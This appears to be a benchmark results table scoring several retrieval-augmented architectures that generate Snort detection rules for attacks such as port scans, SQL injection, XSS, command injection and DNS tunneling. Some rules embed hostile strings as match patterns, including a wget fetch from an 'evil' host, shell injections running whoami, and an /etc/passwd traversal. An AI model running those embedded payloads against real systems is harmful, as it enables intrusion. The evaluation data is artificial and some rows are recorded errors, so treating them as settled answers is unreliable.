query,expected_attack_type,architecture,predicted_attack_type,attack_type_correct,valid_rule_or_benign,retrieval_hit_at_3,option_coverage,hallucination_risk,generated_rule
Detect a TCP SYN port scan against our web server with many ports touched in one minute,port_scan,baseline,port_scan,True,True,False,0.6666666666666666,0.35,"alert tcp $EXTERNAL_NET any -> $HOME_NET any (msg:""LOCAL PORT SCAN detected""; flags:S; detection_filter:track by_src, count 20, seconds 60; classtype:attempted-recon; sid:9051523; rev:1;)"
Detect a TCP SYN port scan against our web server with many ports touched in one minute,port_scan,rag_classic,port_scan,True,True,True,0.6666666666666666,0.0,"alert tcp $EXTERNAL_NET any -> $HOME_NET any (msg:""P1 Port scan repeated SYN 6""; flags:S; detection_filter:track by_src,count 11,seconds 8; classtype:attempted-recon; sid:9100006; rev:1;)"
Detect a TCP SYN port scan against our web server with many ports touched in one minute,port_scan,rag_rerank,port_scan,True,True,True,0.6666666666666666,0.0,"alert tcp $EXTERNAL_NET any -> $HOME_NET any (msg:""P1 Port scan repeated SYN 6""; flags:S; detection_filter:track by_src,count 11,seconds 8; classtype:attempted-recon; sid:9100006; rev:1;)"
Detect a TCP SYN port scan against our web server with many ports touched in one minute,port_scan,rag_hybrid,port_scan,True,True,True,0.6666666666666666,0.0,"alert tcp $EXTERNAL_NET any -> $HOME_NET any (msg:""P1 Port scan repeated SYN 6""; flags:S; detection_filter:track by_src,count 11,seconds 8; classtype:attempted-recon; sid:9100006; rev:1;)"
Detect a TCP SYN port scan against our web server with many ports touched in one minute,port_scan,multi_hop,port_scan,True,True,True,0.6666666666666666,0.0,"alert tcp $EXTERNAL_NET any -> $HOME_NET any (msg:""P1 Port scan repeated SYN 6""; flags:S; detection_filter:track by_src,count 11,seconds 8; classtype:attempted-recon; sid:9100006; rev:1;)"
Detect a TCP SYN port scan against our web server with many ports touched in one minute,port_scan,graph_rag,port_scan,True,True,True,0.6666666666666666,0.0,"alert tcp $EXTERNAL_NET any -> $HOME_NET any (msg:""P1 Port scan repeated SYN 1""; flags:S; detection_filter:track by_src,count 10,seconds 6; classtype:attempted-recon; sid:9100001; rev:1;)"
Detect a TCP SYN port scan against our web server with many ports touched in one minute,port_scan,agentic_rag,port_scan,True,True,True,0.6666666666666666,0.0,"alert tcp $EXTERNAL_NET any -> $HOME_NET any (msg:""P1 Port scan repeated SYN 6""; flags:S; detection_filter:track by_src,count 11,seconds 8; classtype:attempted-recon; sid:9100006; rev:1;)"
Generate a Snort rule for repeated SSH brute force attempts on port 22,ssh_bruteforce,baseline,ssh_bruteforce,True,True,False,0.7777777777777778,0.35,"alert tcp $EXTERNAL_NET any -> $HOME_NET 22 (msg:""LOCAL SSH BRUTEFORCE detected""; flow:to_server; flags:S; detection_filter:track by_src, count 8, seconds 60; classtype:attempted-admin; sid:9870383; rev:1;)"
Generate a Snort rule for repeated SSH brute force attempts on port 22,ssh_bruteforce,rag_classic,ssh_bruteforce,True,True,True,0.7777777777777778,0.0,"alert tcp $EXTERNAL_NET any -> $HOME_NET 22 (msg:""P1 SSH brute force repeated login failures 3""; flow:to_server,established; content:""SSH-""; detection_filter:track by_src,count 8,seconds 60; classtype:attempted-admin; sid:9100023; rev:1;)"
Generate a Snort rule for repeated SSH brute force attempts on port 22,ssh_bruteforce,rag_rerank,ssh_bruteforce,True,True,True,0.7777777777777778,0.0,"alert tcp $EXTERNAL_NET any -> $HOME_NET 22 (msg:""P1 SSH brute force repeated login failures 3""; flow:to_server,established; content:""SSH-""; detection_filter:track by_src,count 8,seconds 60; classtype:attempted-admin; sid:9100023; rev:1;)"
Generate a Snort rule for repeated SSH brute force attempts on port 22,ssh_bruteforce,rag_hybrid,ssh_bruteforce,True,True,True,0.7777777777777778,0.0,"alert tcp $EXTERNAL_NET any -> $HOME_NET 22 (msg:""P1 SSH brute force repeated login failures 3""; flow:to_server,established; content:""SSH-""; detection_filter:track by_src,count 8,seconds 60; classtype:attempted-admin; sid:9100023; rev:1;)"
Generate a Snort rule for repeated SSH brute force attempts on port 22,ssh_bruteforce,multi_hop,ssh_bruteforce,True,True,True,0.7777777777777778,0.0,"alert tcp $EXTERNAL_NET any -> $HOME_NET 22 (msg:""P1 SSH brute force repeated login failures 3""; flow:to_server,established; content:""SSH-""; detection_filter:track by_src,count 8,seconds 60; classtype:attempted-admin; sid:9100023; rev:1;)"
Generate a Snort rule for repeated SSH brute force attempts on port 22,ssh_bruteforce,graph_rag,ssh_bruteforce,True,True,True,0.7777777777777778,0.0,"alert tcp $EXTERNAL_NET any -> $HOME_NET 2222 (msg:""P1 SSH brute force repeated login failures 1""; flow:to_server,established; content:""SSH-""; detection_filter:track by_src,count 6,seconds 60; classtype:attempted-admin; sid:9100021; rev:1;)"
Generate a Snort rule for repeated SSH brute force attempts on port 22,ssh_bruteforce,agentic_rag,ssh_bruteforce,True,True,True,0.7777777777777778,0.0,"alert tcp $EXTERNAL_NET any -> $HOME_NET 22 (msg:""P1 SSH brute force repeated login failures 3""; flow:to_server,established; content:""SSH-""; detection_filter:track by_src,count 8,seconds 60; classtype:attempted-admin; sid:9100023; rev:1;)"
Détecter une injection SQL UNION SELECT dans une URL HTTP,sql_injection,baseline,sql_injection,True,True,False,0.8888888888888888,0.35,"alert tcp $EXTERNAL_NET any -> $HTTP_SERVERS $HTTP_PORTS (msg:""LOCAL SQL INJECTION detected""; flow:to_server,established; content:""select%20""; http_uri; nocase; classtype:web-application-attack; sid:9602343; rev:1;)"
Détecter une injection SQL UNION SELECT dans une URL HTTP,sql_injection,rag_classic,sql_injection,True,True,True,0.7777777777777778,0.0,"alert tcp $EXTERNAL_NET any -> $HOME_NET 80 (msg:""P1 SQL injection payload 1""; flow:to_server,established; content:""UNION SELECT""; nocase; classtype:web-application-attack; sid:9100041; rev:1;)"
Détecter une injection SQL UNION SELECT dans une URL HTTP,sql_injection,rag_rerank,sql_injection,True,True,True,0.7777777777777778,0.0,"alert tcp $EXTERNAL_NET any -> $HOME_NET 80 (msg:""P1 SQL injection payload 1""; flow:to_server,established; content:""UNION SELECT""; nocase; classtype:web-application-attack; sid:9100041; rev:1;)"
Détecter une injection SQL UNION SELECT dans une URL HTTP,sql_injection,rag_hybrid,sql_injection,True,True,True,0.7777777777777778,0.0,"alert tcp $EXTERNAL_NET any -> $HOME_NET 80 (msg:""P1 SQL injection payload 16""; flow:to_server,established; content:""union select null""; nocase; classtype:web-application-attack; sid:9100056; rev:1;)"
Détecter une injection SQL UNION SELECT dans une URL HTTP,sql_injection,multi_hop,sql_injection,True,True,True,0.7777777777777778,0.0,"alert tcp $EXTERNAL_NET any -> $HOME_NET 80 (msg:""P1 SQL injection payload 16""; flow:to_server,established; content:""union select null""; nocase; classtype:web-application-attack; sid:9100056; rev:1;)"
Détecter une injection SQL UNION SELECT dans une URL HTTP,sql_injection,graph_rag,sql_injection,True,True,True,0.7777777777777778,0.0,"alert tcp $EXTERNAL_NET any -> $HOME_NET 80 (msg:""P1 SQL injection payload 1""; flow:to_server,established; content:""UNION SELECT""; nocase; classtype:web-application-attack; sid:9100041; rev:1;)"
Détecter une injection SQL UNION SELECT dans une URL HTTP,sql_injection,agentic_rag,sql_injection,True,True,True,0.7777777777777778,0.0,"alert tcp $EXTERNAL_NET any -> $HOME_NET 80 (msg:""P1 SQL injection payload 16""; flow:to_server,established; content:""union select null""; nocase; classtype:web-application-attack; sid:9100056; rev:1;)"
Detect XSS attack where the URI contains <script>alert(1)</script>,xss,baseline,xss,True,True,False,0.8888888888888888,0.35,"alert tcp $EXTERNAL_NET any -> $HTTP_SERVERS $HTTP_PORTS (msg:""LOCAL XSS detected""; flow:to_server,established; content:""<script""; http_uri; nocase; classtype:web-application-attack; sid:9193888; rev:1;)"
Detect XSS attack where the URI contains <script>alert(1)</script>,xss,rag_classic,xss,True,True,True,0.8888888888888888,0.0,"alert tcp $EXTERNAL_NET any -> $HOME_NET 80 (msg:""P1 XSS payload marker 1""; flow:to_server,established; content:""<script>alert(1)</script""; nocase; pcre:""/\<script\>alert(1)\<\/script\>/i""; classtype:web-application-attack; sid:9100061; rev:1;)"
Detect XSS attack where the URI contains <script>alert(1)</script>,xss,rag_rerank,xss,True,True,True,0.8888888888888888,0.0,"alert tcp $EXTERNAL_NET any -> $HOME_NET 80 (msg:""P1 XSS payload marker 1""; flow:to_server,established; content:""<script>alert(1)</script""; nocase; pcre:""/\<script\>alert(1)\<\/script\>/i""; classtype:web-application-attack; sid:9100061; rev:1;)"
Detect XSS attack where the URI contains <script>alert(1)</script>,xss,rag_hybrid,xss,True,True,True,0.8888888888888888,0.0,"alert tcp $EXTERNAL_NET any -> $HOME_NET 80 (msg:""P1 XSS payload marker 1""; flow:to_server,established; content:""<script>alert(1)</script""; nocase; pcre:""/\<script\>alert(1)\<\/script\>/i""; classtype:web-application-attack; sid:9100061; rev:1;)"
Detect XSS attack where the URI contains <script>alert(1)</script>,xss,multi_hop,xss,True,True,True,0.8888888888888888,0.0,"alert tcp $EXTERNAL_NET any -> $HOME_NET 80 (msg:""P1 XSS payload marker 1""; flow:to_server,established; content:""<script>alert(1)</script""; nocase; pcre:""/\<script\>alert(1)\<\/script\>/i""; classtype:web-application-attack; sid:9100061; rev:1;)"
Detect XSS attack where the URI contains <script>alert(1)</script>,xss,graph_rag,xss,True,True,True,0.8888888888888888,0.0,"alert tcp $EXTERNAL_NET any -> $HOME_NET 80 (msg:""P1 XSS payload marker 1""; flow:to_server,established; content:""<script>alert(1)</script""; nocase; pcre:""/\<script\>alert(1)\<\/script\>/i""; classtype:web-application-attack; sid:9100061; rev:1;)"
Detect XSS attack where the URI contains <script>alert(1)</script>,xss,agentic_rag,xss,True,True,True,0.8888888888888888,0.0,"alert tcp $EXTERNAL_NET any -> $HOME_NET 80 (msg:""P1 XSS payload marker 1""; flow:to_server,established; content:""<script>alert(1)</script""; nocase; pcre:""/\<script\>alert(1)\<\/script\>/i""; classtype:web-application-attack; sid:9100061; rev:1;)"
Detect command injection with cmd parameter and whoami in HTTP request,command_injection,baseline,command_injection,True,True,False,0.8888888888888888,0.35,"alert tcp $EXTERNAL_NET any -> $HTTP_SERVERS $HTTP_PORTS (msg:""LOCAL COMMAND INJECTION detected""; flow:to_server,established; content:""cmd=""; http_uri; content:"";""; http_uri; pcre:""/(whoami|id|wget|curl)/Ui""; classtype:web-application-attack; sid:9330310; rev:1;)"
Detect command injection with cmd parameter and whoami in HTTP request,command_injection,rag_classic,command_injection,True,True,True,0.7777777777777778,0.0,"alert tcp $EXTERNAL_NET any -> $HOME_NET 80 (msg:""P1 Command injection payload 19""; flow:to_server,established; content:""|cmd.exe /c whoami""; nocase; classtype:web-application-attack; sid:9100099; rev:1;)"
Detect command injection with cmd parameter and whoami in HTTP request,command_injection,rag_rerank,command_injection,True,True,True,0.7777777777777778,0.0,"alert tcp $EXTERNAL_NET any -> $HOME_NET 80 (msg:""P1 Command injection payload 19""; flow:to_server,established; content:""|cmd.exe /c whoami""; nocase; classtype:web-application-attack; sid:9100099; rev:1;)"
Detect command injection with cmd parameter and whoami in HTTP request,command_injection,rag_hybrid,command_injection,True,True,True,0.7777777777777778,0.0,"alert tcp $EXTERNAL_NET any -> $HOME_NET 80 (msg:""P1 Command injection payload 7""; flow:to_server,established; content:""&& bash -c whoami""; nocase; classtype:web-application-attack; sid:9100087; rev:1;)"
Detect command injection with cmd parameter and whoami in HTTP request,command_injection,multi_hop,command_injection,True,True,True,0.7777777777777778,0.0,"alert tcp $EXTERNAL_NET any -> $HOME_NET 80 (msg:""P1 Command injection payload 7""; flow:to_server,established; content:""&& bash -c whoami""; nocase; classtype:web-application-attack; sid:9100087; rev:1;)"
Detect command injection with cmd parameter and whoami in HTTP request,command_injection,graph_rag,command_injection,True,True,True,0.7777777777777778,0.0,"alert tcp $EXTERNAL_NET any -> $HOME_NET 80 (msg:""P1 Command injection payload 1""; flow:to_server,established; content:"";wget http://evil/p.sh""; nocase; classtype:web-application-attack; sid:9100081; rev:1;)"
Detect command injection with cmd parameter and whoami in HTTP request,command_injection,agentic_rag,command_injection,True,True,True,0.7777777777777778,0.0,"alert tcp $EXTERNAL_NET any -> $HOME_NET 80 (msg:""P1 Command injection payload 7""; flow:to_server,established; content:""&& bash -c whoami""; nocase; classtype:web-application-attack; sid:9100087; rev:1;)"
Alert when someone tries ../../../../etc/passwd directory traversal,directory_traversal,baseline,directory_traversal,True,True,False,0.8888888888888888,0.35,"alert tcp $EXTERNAL_NET any -> $HTTP_SERVERS $HTTP_PORTS (msg:""LOCAL DIRECTORY TRAVERSAL detected""; flow:to_server,established; content:""../""; http_uri; content:""/etc/passwd""; http_uri; nocase; classtype:web-application-attack; sid:9051554; rev:1;)"
Alert when someone tries ../../../../etc/passwd directory traversal,directory_traversal,rag_classic,directory_traversal,True,True,True,0.8888888888888888,0.0,"alert tcp $EXTERNAL_NET any -> $HOME_NET 80 (msg:""P1 Directory traversal attempt 1""; flow:to_server,established; content:""../""; nocase; pcre:""/(\.\.|%2f|win\.ini|passwd)/i""; classtype:web-application-attack; sid:9100101; rev:1;)"
Alert when someone tries ../../../../etc/passwd directory traversal,directory_traversal,rag_rerank,directory_traversal,True,True,True,0.8888888888888888,0.0,"alert tcp $EXTERNAL_NET any -> $HOME_NET 80 (msg:""P1 Directory traversal attempt 1""; flow:to_server,established; content:""../""; nocase; pcre:""/(\.\.|%2f|win\.ini|passwd)/i""; classtype:web-application-attack; sid:9100101; rev:1;)"
Alert when someone tries ../../../../etc/passwd directory traversal,directory_traversal,rag_hybrid,directory_traversal,True,True,True,0.8888888888888888,0.0,"alert tcp $EXTERNAL_NET any -> $HOME_NET 80 (msg:""P1 Directory traversal attempt 1""; flow:to_server,established; content:""../""; nocase; pcre:""/(\.\.|%2f|win\.ini|passwd)/i""; classtype:web-application-attack; sid:9100101; rev:1;)"
Alert when someone tries ../../../../etc/passwd directory traversal,directory_traversal,multi_hop,directory_traversal,True,True,True,0.8888888888888888,0.0,"alert tcp $EXTERNAL_NET any -> $HOME_NET 80 (msg:""P1 Directory traversal attempt 1""; flow:to_server,established; content:""../""; nocase; pcre:""/(\.\.|%2f|win\.ini|passwd)/i""; classtype:web-application-attack; sid:9100101; rev:1;)"
Alert when someone tries ../../../../etc/passwd directory traversal,directory_traversal,graph_rag,directory_traversal,True,True,True,0.8888888888888888,0.0,"alert tcp $EXTERNAL_NET any -> $HOME_NET 80 (msg:""P1 Directory traversal attempt 1""; flow:to_server,established; content:""../""; nocase; pcre:""/(\.\.|%2f|win\.ini|passwd)/i""; classtype:web-application-attack; sid:9100101; rev:1;)"
Alert when someone tries ../../../../etc/passwd directory traversal,directory_traversal,agentic_rag,directory_traversal,True,True,True,0.8888888888888888,0.0,"alert tcp $EXTERNAL_NET any -> $HOME_NET 80 (msg:""P1 Directory traversal attempt 1""; flow:to_server,established; content:""../""; nocase; pcre:""/(\.\.|%2f|win\.ini|passwd)/i""; classtype:web-application-attack; sid:9100101; rev:1;)"
Detect DNS tunneling using long encoded subdomains,dns_tunneling,baseline,dns_tunneling,True,False,False,0.6666666666666666,0.35,"alert udp $HOME_NET any -> $EXTERNAL_NET 53 (msg:""LOCAL DNS TUNNELING detected""; dsize:>120; pcre:""/^[A-Za-z0-9]{40,}\./""; classtype:policy-violation; sid:9468372; rev:1;)"
Detect DNS tunneling using long encoded subdomains,dns_tunneling,rag_classic,dns_tunneling,True,True,True,0.7777777777777778,0.0,"alert udp $HOME_NET any -> $EXTERNAL_NET 53 (msg:""P1 DNS tunneling long query 14""; content:""segment""; nocase; dsize:>70; classtype:trojan-activity; sid:9100134; rev:1;)"
Detect DNS tunneling using long encoded subdomains,dns_tunneling,rag_rerank,dns_tunneling,True,True,True,0.7777777777777778,0.0,"alert udp $HOME_NET any -> $EXTERNAL_NET 53 (msg:""P1 DNS tunneling long query 14""; content:""segment""; nocase; dsize:>70; classtype:trojan-activity; sid:9100134; rev:1;)"
Detect DNS tunneling using long encoded subdomains,dns_tunneling,rag_hybrid,dns_tunneling,True,True,True,0.7777777777777778,0.0,"alert udp $HOME_NET any -> $EXTERNAL_NET 53 (msg:""P1 DNS tunneling long query 14""; content:""segment""; nocase; dsize:>70; classtype:trojan-activity; sid:9100134; rev:1;)"
Detect DNS tunneling using long encoded subdomains,dns_tunneling,multi_hop,dns_tunneling,True,True,True,0.7777777777777778,0.0,"alert udp $HOME_NET any -> $EXTERNAL_NET 53 (msg:""P1 DNS tunneling long query 14""; content:""segment""; nocase; dsize:>70; classtype:trojan-activity; sid:9100134; rev:1;)"
Detect DNS tunneling using long encoded subdomains,dns_tunneling,graph_rag,dns_tunneling,True,True,True,0.7777777777777778,0.0,"alert udp $HOME_NET any -> $EXTERNAL_NET 53 (msg:""P1 DNS tunneling long query 2""; content:""segment""; nocase; dsize:>70; classtype:trojan-activity; sid:9100122; rev:1;)"
Detect DNS tunneling using long encoded subdomains,dns_tunneling,agentic_rag,dns_tunneling,True,True,True,0.7777777777777778,0.0,"alert udp $HOME_NET any -> $EXTERNAL_NET 53 (msg:""P1 DNS tunneling long query 14""; content:""segment""; nocase; dsize:>70; classtype:trojan-activity; sid:9100134; rev:1;)"
Detect ICMP ping sweep against internal network,icmp_sweep,baseline,icmp_sweep,True,True,False,0.6666666666666666,0.35,"alert icmp $EXTERNAL_NET any -> $HOME_NET any (msg:""LOCAL ICMP SWEEP detected""; itype:8; detection_filter:track by_src, count 15, seconds 60; classtype:attempted-recon; sid:9375244; rev:1;)"
Detect ICMP ping sweep against internal network,icmp_sweep,rag_classic,icmp_sweep,True,True,True,0.6666666666666666,0.0,"alert icmp $EXTERNAL_NET any -> $HOME_NET any (msg:""P1 ICMP sweep repeated echo requests 17""; dsize:>40; detection_filter:track by_src,count 6,seconds 5; classtype:attempted-recon; sid:9100157; rev:1;)"
Detect ICMP ping sweep against internal network,icmp_sweep,rag_rerank,icmp_sweep,True,True,True,0.6666666666666666,0.0,"alert icmp $EXTERNAL_NET any -> $HOME_NET any (msg:""P1 ICMP sweep repeated echo requests 17""; dsize:>40; detection_filter:track by_src,count 6,seconds 5; classtype:attempted-recon; sid:9100157; rev:1;)"
Detect ICMP ping sweep against internal network,icmp_sweep,rag_hybrid,icmp_sweep,True,True,True,0.6666666666666666,0.0,"alert icmp $EXTERNAL_NET any -> $HOME_NET any (msg:""P1 ICMP sweep repeated echo requests 14""; dsize:>40; detection_filter:track by_src,count 7,seconds 5; classtype:attempted-recon; sid:9100154; rev:1;)"
Detect ICMP ping sweep against internal network,icmp_sweep,multi_hop,command_injection,False,True,True,0.7777777777777778,0.0,"alert tcp $EXTERNAL_NET any -> $HOME_NET 443 (msg:""P1 Command injection payload 14""; flow:to_server,established; content:""; ping -c 1 198.51.100.8""; nocase; classtype:web-application-attack; sid:9100094; rev:1;)"
Detect ICMP ping sweep against internal network,icmp_sweep,graph_rag,icmp_sweep,True,True,True,0.6666666666666666,0.0,"alert icmp $EXTERNAL_NET any -> $HOME_NET any (msg:""P1 ICMP sweep repeated echo requests 1""; dsize:>40; detection_filter:track by_src,count 6,seconds 5; classtype:attempted-recon; sid:9100141; rev:1;)"
Detect ICMP ping sweep against internal network,icmp_sweep,agentic_rag,command_injection,False,True,True,0.7777777777777778,0.0,"alert tcp $EXTERNAL_NET any -> $HOME_NET 443 (msg:""P1 Command injection payload 14""; flow:to_server,established; content:""; ping -c 1 198.51.100.8""; nocase; classtype:web-application-attack; sid:9100094; rev:1;)"
Detect malware command and control beacon to /gate.php,malware_c2,baseline,malware_c2,True,True,False,1.0,0.35,"alert tcp $HOME_NET any -> $EXTERNAL_NET $HTTP_PORTS (msg:""LOCAL MALWARE C2 detected""; flow:to_server,established; content:""/gate.php""; http_uri; content:""User-Agent|3A|""; http_header; nocase; classtype:trojan-activity; sid:9114534; rev:1;)"
Detect malware command and control beacon to /gate.php,malware_c2,rag_classic,malware_c2,True,True,True,0.8888888888888888,0.0,"alert tcp $HOME_NET any -> $EXTERNAL_NET 80 (msg:""P1 Malware C2 beacon 2""; flow:to_server,established; content:""/gate.php""; nocase; detection_filter:track by_src,count 4,seconds 300; classtype:trojan-activity; sid:9100162; rev:1;)"
Detect malware command and control beacon to /gate.php,malware_c2,rag_rerank,malware_c2,True,True,True,0.8888888888888888,0.0,"alert tcp $HOME_NET any -> $EXTERNAL_NET 80 (msg:""P1 Malware C2 beacon 2""; flow:to_server,established; content:""/gate.php""; nocase; detection_filter:track by_src,count 4,seconds 300; classtype:trojan-activity; sid:9100162; rev:1;)"
Detect malware command and control beacon to /gate.php,malware_c2,rag_hybrid,malware_c2,True,True,True,0.8888888888888888,0.0,"alert tcp $HOME_NET any -> $EXTERNAL_NET 80 (msg:""P1 Malware C2 beacon 2""; flow:to_server,established; content:""/gate.php""; nocase; detection_filter:track by_src,count 4,seconds 300; classtype:trojan-activity; sid:9100162; rev:1;)"
Detect malware command and control beacon to /gate.php,malware_c2,multi_hop,malware_c2,True,True,True,0.8888888888888888,0.0,"alert tcp $HOME_NET any -> $EXTERNAL_NET 80 (msg:""P1 Malware C2 beacon 2""; flow:to_server,established; content:""/gate.php""; nocase; detection_filter:track by_src,count 4,seconds 300; classtype:trojan-activity; sid:9100162; rev:1;)"
Detect malware command and control beacon to /gate.php,malware_c2,graph_rag,malware_c2,True,True,True,0.8888888888888888,0.0,"alert tcp $HOME_NET any -> $EXTERNAL_NET 443 (msg:""P1 Malware C2 beacon 1""; flow:to_server,established; content:""/beacon""; nocase; detection_filter:track by_src,count 4,seconds 300; classtype:trojan-activity; sid:9100161; rev:1;)"
Detect malware command and control beacon to /gate.php,malware_c2,agentic_rag,malware_c2,True,True,True,0.8888888888888888,0.0,"alert tcp $HOME_NET any -> $EXTERNAL_NET 80 (msg:""P1 Malware C2 beacon 2""; flow:to_server,established; content:""/gate.php""; nocase; detection_filter:track by_src,count 4,seconds 300; classtype:trojan-activity; sid:9100162; rev:1;)"
"Normal HTTP health check from the monitoring server, no attack",benign_traffic,baseline,benign_traffic,True,True,False,0.0,0.2,NO_RULE_RECOMMENDED
"Normal HTTP health check from the monitoring server, no attack",benign_traffic,rag_classic,benign_traffic,True,True,True,0.0,0.0,NO_RULE_RECOMMENDED
"Normal HTTP health check from the monitoring server, no attack",benign_traffic,rag_rerank,benign_traffic,True,True,True,0.0,0.0,NO_RULE_RECOMMENDED
"Normal HTTP health check from the monitoring server, no attack",benign_traffic,rag_hybrid,benign_traffic,True,True,True,0.0,0.0,NO_RULE_RECOMMENDED
"Normal HTTP health check from the monitoring server, no attack",benign_traffic,multi_hop,benign_traffic,True,True,True,0.5555555555555556,0.0,"alert tcp $EXTERNAL_NET any -> $HOME_NET any (msg:""LOCAL BENIGN TRAFFIC detected""; flags:S; classtype:attempted-recon; sid:9035863; rev:1;)"
"Normal HTTP health check from the monitoring server, no attack",benign_traffic,graph_rag,benign_traffic,True,True,True,0.0,0.0,NO_RULE_RECOMMENDED
"Normal HTTP health check from the monitoring server, no attack",benign_traffic,agentic_rag,benign_traffic,True,True,True,0.0,0.0,NO_RULE_RECOMMENDED
